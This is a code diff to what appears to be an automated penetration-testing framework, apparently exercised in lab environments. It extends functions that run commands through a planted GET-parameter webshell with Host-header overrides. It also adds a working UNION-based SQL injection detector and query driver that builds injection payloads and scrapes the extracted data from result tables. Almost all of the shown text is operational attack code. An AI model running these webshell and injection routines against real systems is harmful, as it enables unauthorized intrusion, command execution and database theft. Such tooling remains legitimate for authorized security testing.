@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import os
 import re
+import html
 import secrets
 import subprocess
 import time
@@ -40,18 +41,29 @@ class PrimitiveError(Exception):
 
 @dataclass
 class HTTPSession:
-    """Authenticated web session (cookie jar + base URL)."""
+    """Authenticated web session (cookie jar + base URL + optional vhost)."""
 
     base: str
     cookies: Dict[str, str] = field(default_factory=dict)
+    vhost: Optional[str] = None  # Host header override for vhost-routed apps
 
     def _url(self, path: str) -> str:
         return path if path.startswith("http") else f"{self.base}/{path.lstrip('/')}"
 
+    def _headers(self, extra=None):
+        h = {}
+        if self.vhost:
+            h["Host"] = self.vhost
+        if extra:
+            h.update(extra)
+        return h
+
     def get(self, path: str, timeout: int = _TIMEOUT, **kw):
+        kw.setdefault("headers", self._headers())
         return requests.get(self._url(path), cookies=self.cookies, timeout=timeout, **kw)
 
     def post(self, path: str, data=None, timeout: int = _TIMEOUT, **kw):
+        kw.setdefault("headers", self._headers())
         return requests.post(self._url(path), cookies=self.cookies, data=data, timeout=timeout, **kw)
 
 
@@ -62,14 +74,16 @@ def make_nonce() -> str:
     return f"strikearc_{secrets.token_hex(4)}"
 
 
-def exec_webshell(url: str, cmd: str, param: str = "c", timeout: int = 15) -> Optional[str]:
+def exec_webshell(url: str, cmd: str, param: str = "c", timeout: int = 15,
+                   vhost: Optional[str] = None) -> Optional[str]:
     """Execute cmd via GET-param webshell; nonce-verify nothing.
 
     Returns stdout-like text or None. The VERIFICATION lives in
     verify_webshell() — raw exec is for already-verified transports.
     """
     try:
-        r = requests.get(url, params={param: cmd}, timeout=timeout)
+        headers = {"Host": vhost} if vhost else None
+        r = requests.get(url, params={param: cmd}, headers=headers, timeout=timeout)
         if r.status_code != 200:
             return None
         return r.text
@@ -78,18 +92,19 @@ def exec_webshell(url: str, cmd: str, param: str = "c", timeout: int = 15) -> Op
         return None
 
 
-def verify_webshell(url: str, param: str = "c") -> bool:
+def verify_webshell(url: str, param: str = "c", vhost: Optional[str] = None) -> bool:
     """A shell is real only when a nonce command round-trips (v9 §2.1)."""
     nonce = make_nonce()
-    out = exec_webshell(url, f"echo {nonce}", param=param)
+    out = exec_webshell(url, f"echo {nonce}", param=param, vhost=vhost)
     ok = bool(out and nonce in out)
     _log("verify_webshell", f"{'VERIFIED' if ok else 'DEAD'} {url}")
     return ok
 
 
-def build_webshell_session(url: str, param: str = "c") -> Optional[WebshellTransport]:
+def build_webshell_session(url: str, param: str = "c",
+                            vhost: Optional[str] = None) -> Optional[WebshellTransport]:
     """Verify then wrap — returns None unless the nonce round-trips."""
-    if not verify_webshell(url, param=param):
+    if not verify_webshell(url, param=param, vhost=vhost):
         return None
     return WebshellTransport(url, param=param)
 
@@ -217,6 +232,7 @@ def parse_sqlmap_rows(out: str) -> List[Dict[str, str]]:
             continue
         rows.append(cells)
     # scan for header-sep-data pattern
+    tables: List[tuple] = []
     i = 0
     while i < len(rows) - 2:
         if all(re.fullmatch(r"-{2,}", c) for c in rows[i + 1]):
@@ -244,7 +260,155 @@ def _with_params(base: str, path: str, params: Dict[str, str]) -> str:
     return f"{base}/{path.lstrip('/')}?{urlencode(params)}"
 
 
+# ─── UNION SQLi via search-style forms (v9.1) ────────────────────────
+
+
+def union_sqli_search(
+    url: str,
+    field: str,
+    vhost: Optional[str] = None,
+    method: str = "POST",
+    timeout: int = _TIMEOUT,
+) -> Optional["UnionSQLi"]:
+    """Detect + wrap a LIKE-style UNION SQLi in a search form.
+
+    Technique validated live against status.inlanefreight.local (run-20
+    manual chain): apps that echo their query under ?debug=true disclose
+    the injection context. We probe with a canonical UNION row and look
+    for our marker rendered in the result table.
+
+    Returns a UnionSQLi driver or None. The driver's queries are
+    deterministic — no sqlmap, no LLM command strings.
+    """
+    probe_col = "strikearc_probe"
+    weak_hits = []
+    for ncols in (4, 5, 3, 6, 2):  # 4 first — most common in the wild
+        for rcol in range(1, ncols + 1):
+            # place the probe in EVERY position — the page may render only
+            # some columns (status vhost renders cols 2-4, live lesson)
+            cols = ["NULL"] * ncols
+            cols[rcol - 1] = f"'{probe_col}'"
+            payload = f"' UNION SELECT {','.join(cols)}-- -"
+            body = _sqli_form_post(url, field, payload, vhost, method, timeout)
+            dcol = _locate_cell(body, probe_col)
+            if dcol:
+                u = UnionSQLi(url=url, field=field, ncols=ncols, rcol=rcol,
+                              dcol=dcol, vhost=vhost, method=method, timeout=timeout)
+                _log("union_sqli_search",
+                     f"CONFIRMED UNION SQLi at {url} ({ncols} cols, "
+                     f"payload col {rcol} renders at cell {dcol})")
+                return u
+            # also accept the probe echoed in the debug div (column context
+            # disclosure) but only as a weaker signal if no table render
+            if body and probe_col in body and ncols == 4 and rcol == 1:
+                weak_hits.append(body)
+    _log("union_sqli_search", f"no UNION signal at {url}")
+    return None
+
+
+def _sqli_form_post(url, field, payload, vhost, method, timeout):
+    headers = {"Host": vhost} if vhost else {}
+    try:
+        if method.upper() == "GET":
+            r = requests.get(url, params={field: payload, "debug": "true"},
+                             headers=headers, timeout=timeout)
+        else:
+            data = {field: payload}
+            full = url if "debug=true" in url else url + "?debug=true"
+            r = requests.post(full, data=data, headers=headers, timeout=timeout)
+        if r.status_code != 200:
+            return None
+        return r.text
+    except requests.RequestException as e:
+        _log("_sqli_form_post", f"request failed: {e.__class__.__name__}")
+        return None
+
+
+class UnionSQLi:
+    """Deterministic UNION-SQLi query driver.
+
+    The first selected column renders into the page's result table;
+    remaining columns are NULL filler. query() returns the first cell.
+    """
+
+    def __init__(self, url, field, ncols, rcol=1, dcol=1, vhost=None,
+                 method="POST", timeout=_TIMEOUT):
+        self.url = url
+        self.field = field
+        self.ncols = ncols
+        self.rcol = rcol  # 1-based payload position carrying the SQL
+        self.dcol = dcol  # 1-based display cell position where it renders
+        self.vhost = vhost
+        self.method = method
+        self.timeout = timeout
+
+    def _payload(self, sql: str) -> str:
+        # sql is "expr FROM ..." — the FROM clause must trail the whole
+        # select list, not sit inside it (live lesson: mid-list FROM is
+        # a syntax error and renders zero rows).
+        parts = sql.split(" FROM ", 1)
+        expr = parts[0]
+        from_clause = (" FROM " + parts[1]) if len(parts) == 2 else ""
+        cols = ["NULL"] * self.ncols
+        cols[self.rcol - 1] = expr
+        return f"' UNION SELECT {','.join(cols)}{from_clause}-- -"
+
+    def query(self, sql: str) -> str:
+        body = _sqli_form_post(self.url, self.field, self._payload(sql),
+                               self.vhost, self.method, self.timeout)
+        cells = _extract_result_cells(body, rcol=self.dcol)
+        return cells[0] if cells else ""
+
+    def rows(self, sql: str) -> List[str]:
+        body = _sqli_form_post(self.url, self.field, self._payload(sql),
+                               self.vhost, self.method, self.timeout)
+        return _extract_result_cells(body, rcol=self.dcol)
+
+
+def _locate_cell(body: str, needle: str) -> int:
+    """Return the 1-based display-cell position containing needle, else 0."""
+    if not body:
+        return 0
+    m = re.search(r"searchheader.*?</tr>(.*?)</table>", body, re.S)
+    if not m:
+        m = re.search(r"</thead>(.*?)</table>", body, re.S)
+    if not m:
+        return 0
+    for tr in re.findall(r"<tr[^>]*>(.*?)</tr>", m.group(1), re.S):
+        tds = re.findall(r"<td[^>]*>(.*?)</td>", tr, re.S)
+        for i, td in enumerate(tds):
+            if needle in html.unescape(td):
+                return i + 1
+    return 0
+
+
+def _extract_result_cells_text(body: str) -> str:
+    return " ".join(_extract_result_cells(body))
+
+
+def _extract_result_cells(body: str, rcol: int = 1) -> List[str]:
+    """Pull rendered result cells: the rcol-th <td> of each row after the
+    header (status vhost renders cols 2-4; col 1 never displays)."""
+    if not body:
+        return []
+    m = re.search(r"searchheader.*?</tr>(.*?)</table>", body, re.S)
+    if not m:
+        m = re.search(r"</thead>(.*?)</table>", body, re.S)
+    if not m:
+        return []
+    out = []
+    for tr in re.findall(r"<tr[^>]*>(.*?)</tr>", m.group(1), re.S):
+        tds = re.findall(r"<td[^>]*>(.*?)</td>", tr, re.S)
+        if len(tds) >= rcol:
+            out.append(html.unescape(tds[rcol - 1]).strip())
+    return out
+
+
 # ─── Upload (URL-verified) ────────────────────────────────────────────
+
+
+# ─── Upload (URL-verified) ────────────────────────────────────────────
+
 
 
 def upload_file(
